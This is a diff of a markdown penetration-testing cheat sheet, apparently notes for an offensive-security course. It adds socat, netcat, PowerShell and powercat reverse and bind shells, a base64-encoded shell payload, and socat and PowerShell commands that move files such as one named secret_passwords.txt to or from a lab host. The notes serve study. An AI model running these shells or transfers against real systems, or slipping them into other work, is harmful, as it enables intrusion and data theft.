@@ -12,15 +12,53 @@ Get help for particular nse script
 
 `nmap --script-help svn-brute.nse`
 
-## SCP to copy files
+## Transfer files
 
-Upload file/folder
+* Transfering files with SCP
 
-`scp -r local.txt host:/path/to/dest`
+```
+// scp upload file/folder
+scp -r local.txt host:/path/to/dest
 
-Download file/folder
+// scp download file/folder
+scp -r host:/path/to/remote.txt remote.txt
+```
+* Using Socat to transfer files
 
-`scp -r host:/path/to/remote.txt .`
+```
+// listen and spawn child process on connect
+socat TCP4-LISTEN:1443,fork file:secret_passwords.txt
+
+// connect and create new file
+socat TCP4:10.11.0.4:443 file:received_secret_passwords.txt,create
+
+//encrypted shells require pem certificate
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 365 -out bind_shell.crt && cat bind_shell.key bind_shell.crt > bind_shell.pem
+
+// listener
+sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin
+/bash
+
+// connector
+socat - OPENSSL:10.11.0.4:443,verify=0
+```
+
+* PowerShell File Transfers
+
+```
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http:/
+/10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
+```
+
+* Powercat file transfer
+
+```
+// connect to host and transfer local file powercat.ps1
+powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
+
+sudo nc -lnvp 443 > receiving_powercat.ps1
+```
+
 
 ## Directory Brute Force
 
@@ -43,13 +81,13 @@ __Local Forwarding__ - Binding to local machine port 8080 and forwarding to 10.1
 
 `ssh -L 8080:10.10.10.203:80 vps_ip`
 
-__Remote forwarding__ - Remote ssh server listens on remote port 8080 and forwards all the traffic to remote port 8080 via ssh client to destination host.(Opposite of Local Forwarding)
+__Remote forwarding__ - Remote ssh server listens on remote port 8080 and forwards all the traffic destined to remote port 8080 via ssh to destination host.(Opposite of Local Forwarding)
 
 `ssh -R 8080:localhost:80 public.example.com`
 
 __Dynamic Forwarding__ - Dynamic port forwarding allows you to create a socket on the local (ssh client) machine, which acts as a SOCKS proxy server. Running below command on vps will make it act as a socks proxy on port 8080.
 
-`ssh -D vps_ip:8080 vps_ip`
+`ssh -D 96.126.72.56:8080 96.126.72.56`
 
 
 ## SVN commands
@@ -96,7 +134,7 @@ netstat -antp --> running services and ports
 * Netcat Shells
 
 ```
-nc -nv 192.168.145.129 4444 -e /bin/bash 2> error_log 
+nc -nv 192.168.145.129 4444 -e /bin/bash 2> /tmp/error_log 
 nc -nlvp 4444 
 
 ncat is similar to nc but also supports ssl for encryption
@@ -112,10 +150,87 @@ sbd -lp 4444 -k secret -e /bin/bash
 sbd -k secret 127.0.0.1 4444
 ```
 
+* Socat Shells
+
+```
+// create an IPv4 listener on port 443, and connect STDOUT to the TCP socket
+socat TCP4-LISTEN:1443 STDOUT
+
+// connect to remote host and execute /bin/bash
+socat TCP4:10.11.0.22:443 EXEC:/bin/bash
+
+// encrypted shell requires pem certificate
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 365 -out bind_shell.crt && cat bind_shell.key bind_shell.crt > bind_shell.pem
+
+// listener
+socat OPENSSL-LISTEN:1443,cert=bind_shell.pem,verify=0,fork EXEC:/bin
+/bash
+
+// connector
+socat - OPENSSL:10.11.0.4:443,verify=0
+```
+
+* Powershell shells
+
+```
+// reverse shell
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+// bind shell
+powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
+```
+
+* Powercat shell
+
+```
+// reverse shell
+powercat -c 10.11.0.4 -p 443 -e cmd.exe
+sudo nc -lvp 443
+
+// bind shell
+powercat -l -p 443 -e cmd.exe
+nc 10.11.0.22 443
+
+// generate base64 encoded reverse shell command
+powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
+
+// needs to pass the whole
+encoded string to powershell.exe
+powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFM
+AZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBt
+```
+
+
 ## Firewall Commands
 
 Disable firewall
 
 ```
 ufw disable
+```
+
+## Comparing Files
+
+```
+// compare sorted files
+comm scan-a.txt scan-b.txt
+
+// return only the lines that were found in both files
+comm -12 scan-a.txt scan-b.txt
+```
+
+```
+diff -c scan-a.txt scan-b.txt
+
+// unified format does not show lines that match between files
+diff -u scan-a.txt scan-b.txt
+```
+
+```
+vimdiff scan-a.txt scan-b.txt
+
+do : gets changes from the other window into the current one
+dp : puts the changes from the current window into the other one
+]c : jumps to the next change
+[c : jumps to the previous change
 ```
